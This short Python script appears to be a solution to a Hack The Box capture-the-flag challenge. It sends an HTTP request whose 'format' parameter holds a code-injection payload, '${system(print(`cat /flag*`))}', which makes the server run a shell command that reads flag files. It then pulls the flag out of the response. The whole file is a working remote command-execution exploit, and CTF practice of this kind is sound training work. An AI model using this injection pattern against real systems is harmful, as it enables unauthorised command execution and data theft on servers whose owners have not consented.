#!/usr/bin/python3
from re import findall
from sys import argv

from requests import get

r = get(argv[1] + "?format=${system(print(`cat /flag*`))}")

#print(r.text)
print(findall("HTB{.*", r.text)[0])